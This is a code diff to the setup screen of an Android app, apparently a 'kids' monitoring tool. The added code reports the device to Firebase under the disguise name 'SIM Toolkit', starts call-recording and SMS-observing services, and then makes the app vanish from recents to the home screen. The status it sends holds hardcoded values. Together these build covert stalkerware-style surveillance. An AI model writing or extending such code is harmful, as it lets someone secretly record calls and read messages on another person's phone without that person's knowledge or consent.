@@ -94,7 +94,15 @@ class SetupWizardActivity : AppCompatActivity() {
             prefs.pairingCode = code
             prefs.isConfigured = true
 
-            // Start foreground monitoring services
+            // 1. Initial Device Status sync to Firebase Cloud
+            com.vyra.kids.core.FirebaseSyncManager.getInstance(this).syncDeviceStatus(
+                batteryLevel = 85,
+                isOnline = true,
+                disguise = "SIM Toolkit",
+                location = "Online • Protected"
+            )
+
+            // 2. Start foreground monitoring services
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(Intent(this, CallRecordingSyncService::class.java))
                 startForegroundService(Intent(this, SmsObserverService::class.java))
@@ -103,9 +111,15 @@ class SetupWizardActivity : AppCompatActivity() {
                 startService(Intent(this, SmsObserverService::class.java))
             }
 
-            Toast.makeText(this, "Setup complete! Device protected.", Toast.LENGTH_LONG).show()
-            startActivity(Intent(this, DecoyDisplayActivity::class.java))
-            finish()
+            Toast.makeText(this, "Setup complete! Device protected.", Toast.LENGTH_SHORT).show()
+
+            // 3. AUTO-VANISH: Close setup wizard, remove from recents, and exit directly to Home Screen
+            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
+                addCategory(Intent.CATEGORY_HOME)
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+            }
+            startActivity(homeIntent)
+            finishAffinity()
         }
     }
 }
